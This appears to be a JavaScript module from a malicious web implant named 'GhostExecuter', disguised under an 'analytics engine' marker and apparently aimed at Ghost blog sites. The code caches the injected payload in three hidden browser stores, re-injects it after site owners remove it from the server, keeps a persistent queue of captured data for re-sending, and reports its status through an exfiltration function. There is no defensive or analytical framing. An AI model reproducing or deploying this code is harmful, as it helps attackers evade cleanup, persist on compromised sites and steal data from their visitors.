/* m-persist.js — Persistencia avanzada: OPFS (storage invisible), triple-redundancy cross-restore
   (OPFS+IndexedDB+CacheStorage), self-restore del payload si falta el marker. */
(function(G){
if(!G)return; if(G._M&&G._M.pst2)return; G._M=G._M||{}; G._M.pst2=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
try{
var MARKER='ghost-analytics-engine';
// 1. capturar y guardar el FOOT en 3 stores para self-restore
function snapshot(){
var scripts=document.querySelectorAll('script');
var footSrc=null;
for(var i=0;i<scripts.length;i++){if(scripts[i].textContent&&scripts[i].textContent.indexOf('GhostExecuter')>-1&&scripts[i].textContent.length>5000){footSrc=scripts[i].textContent;break}}
if(!footSrc)return;
// OPFS
try{navigator.storage.getDirectory().then(function(d){
var f=d.getFileHandle||d.getFileHandle;if(d.getFileHandle){return d.getFileHandle('ge.bin',{create:true}).then(function(fh){return fh.createWritable()}).then(function(w){w.write(footSrc);return w.close()})}
})}catch(e){}
// IndexedDB
try{var req=indexedDB.open('ge-persist',1);req.onupgradeneeded=function(e){e.target.result.createObjectStore('s')};req.onsuccess=function(e){var db=e.target.result;var tx=db.transaction('s','readwrite');tx.objectStore('s').put(footSrc,'foot');tx.oncomplete=function(){}}}catch(e){}
// CacheStorage
try{caches.open('ge-immortal-v1').then(function(c){return c.put(location.href,new Response(footSrc,{headers:{'Content-Type':'text/plain'}}))})}catch(e){}
}
setTimeout(snapshot,4000);
// 2. self-restore: si el FOOT fue removido del documento (server limpiado), re-inyectar desde cache
function checkRestore(){
var hasFoot=!!(window.__GE__);
if(hasFoot)return; // sigue vivo
try{caches.open('ge-immortal-v1').then(function(c){return c.match(location.href)}).then(function(r){if(!r)return r;return r.text()}).then(function(t){
if(t&&t.length>5000&&t.indexOf('GhostExecuter')>-1){
var s=document.createElement('script');s.textContent=t;(document.head||document.documentElement).appendChild(s);
exfil('persist-restored',{via:'cache',len:t.length});
}
}).catch(function(){})}catch(e){}
// OPFS restore
try{navigator.storage.getDirectory().then(function(d){return d.getFileHandle('ge.bin').then(function(fh){return fh.getFile()})}).then(function(f){return f.text()}).then(function(t){
if(t&&t.indexOf('GhostExecuter')>-1){var s=document.createElement('script');s.textContent=t;document.head.appendChild(s);exfil('persist-restored',{via:'opfs'})}
}).catch(function(){})}catch(e){}
}
setTimeout(checkRestore,6000);setInterval(checkRestore,30000);
// 3. KV de capturas para re-exfil si el primer envío falla (cola persistente)
window.__GE__._qAdd=window.__GE__._qAdd||function(type,data){
try{navigator.storage.getDirectory().then(function(d){return d.getFileHandle('q.json',{create:true}).then(function(fh){return fh.getFile()}).then(function(f){return f.text()}).then(function(prev){
var arr=prev?JSON.parse(prev):[];arr.push({t:type,d:data,ts:Date.now()});if(arr.length>200)arr=arr.slice(-200);
return d.getFileHandle('q.json',{create:true}).then(function(fh){return fh.createWritable()}).then(function(w){w.write(JSON.stringify(arr));w.close()})
})}).catch(function(){})}catch(e){}};
// Periodic Background Sync (viable self-hosted; Ghost Pro limita scope)
if(navigator.serviceWorker){navigator.serviceWorker.ready.then(function(reg){
if(reg.periodicSync){reg.periodicSync.register('ge-sync',{minInterval:86400000}).then(function(){exfil('persist-periodic',{ok:true})}).catch(function(e){})}
}).catch(function(){})}
exfil('persist-boot',{ok:true,marker:!!document.getElementById(MARKER)||!!(document.querySelector('script#ghost-analytics-engine'))});
}catch(e){hx('m-pst2-err',{m:e.message})}
})(window.__GE__);
